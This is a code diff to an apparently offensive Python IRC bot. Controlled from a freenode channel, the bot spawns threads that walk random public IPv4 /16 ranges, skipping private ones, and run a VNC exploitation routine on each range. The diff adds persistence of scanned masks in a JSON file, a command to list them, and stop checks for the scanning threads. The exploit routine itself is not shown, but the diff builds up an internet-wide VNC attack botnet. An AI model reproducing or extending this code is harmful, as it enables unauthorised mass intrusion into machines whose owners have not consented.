@@ -14,8 +14,10 @@ class Bot:
 		self.__buffers = []
 		self.__channels = []
 		self.__threads = {}
+		self.__vnc = {}
 		self.__key = 0
 		self.__nick = nick
+		self.load_masks()
 
 	def add_connection(self, sv, port):
 		con = Connection(sv, port)
@@ -81,6 +83,17 @@ class Bot:
 		for job in jobs:	
 			self.__threads[key].append(job)
 
+	def load_masks(self):
+		vncf = open('vnc.json', 'r')
+		vncj = json.load(vncf)
+		self.__vnc['masks'] = vncj['masks']
+		vncf.close()
+
+	def update_masks(self):
+		vncf = open('vnc.json', 'w')
+		vncf.write(json.dumps(self.__vnc))
+		vncf.close()
+
 	def parse_cmd(self, cmd):
 		args = cmd[2:].split(' ')
 		if len(args) > 1:
@@ -101,9 +114,12 @@ class Bot:
 			self.printayne('5 jobs now exploiting the mask {0}'.format(args[0]), self.__channels)
 		if (cmd == 'vnc_global'):
 			t = Thread(target=self.vnc_global, args=(args[0] == 'clean',))
-			t.start()
 			self.add_jobs('vnc', [t])
+			t.start()
 			self.printayne('global vnc scan initialized', self.__channels)
+			self.update_masks()
+		if (cmd == 'masks'):
+			self.printayne('masks => {0}'.format(' - '.join(self.__vnc['masks'])), self.__channels)
 		if (cmd == 'jobs'):
 			ct = 0
 			jobs = ''
@@ -149,25 +165,17 @@ class Bot:
 			[t.join() for t in threads]
 
 	def vnc_global(self, clean):
-		mask_done = []
-		if not clean:
-			print('not clean')
-			vncd_f = open('vnc_done.json', 'r')
-			vncd_j = json.load(vncd_f)
-			vncd_f.close()
-			mask_done = vncd_j['masks']
-			print mask_done
+		if clean:
+			self.__vnc['masks'] = []
 		r_first, r_second, mask = self.random_mask()
 		while True:
+			if ('vnc' in self.__threads and not self.__threads['vnc']) or 'vnc' not in self.__threads:
+					return
 			#subnetworks in 192.168.x.x or between 172.16 and 172.31 are private so no need for scanning
-			while mask in mask_done or r_first == 10 or mask == '192.168' or (r_first == 172 and r_second >= 16 and r_second <= 31):
+			while mask in self.__vnc['masks'] or r_first == 10 or mask == '192.168' or (r_first == 172 and r_second >= 16 and r_second <= 31):
 				r_first, r_second, mask = self.random_mask()
 			self.vnc_newb_expl_div(mask, True)
-			vncd_f = open('vnc_done.json', 'w')
-			mask_done.append(mask)
-			j = {'masks': mask_done}
-			vncd_f.write(json.dumps(j))
-			vncd_f.close()
+			self.__vnc['masks'].append(mask)
 
 	def work(self):
 		while True:
@@ -182,12 +190,12 @@ class Bot:
 					self.parse(clean)
 
 if __name__ == '__main__':
-	"""
 	bot = Bot('woodoozera')
 	bot.add_connection('irc.freenode.org', 6667)
 	bot.set_channels(['#woodoo'])
 	bot.connect()
 	"""
+	TEST
 	bot = Bot('woodoozera')
 	Thread(target=bot.vnc_global, args=(True,)).start()
 	Thread(target=bot.vnc_global, args=(False,)).start()
@@ -200,3 +208,4 @@ if __name__ == '__main__':
 	i = 0
 	while 1:
 		i += 1
+	"""
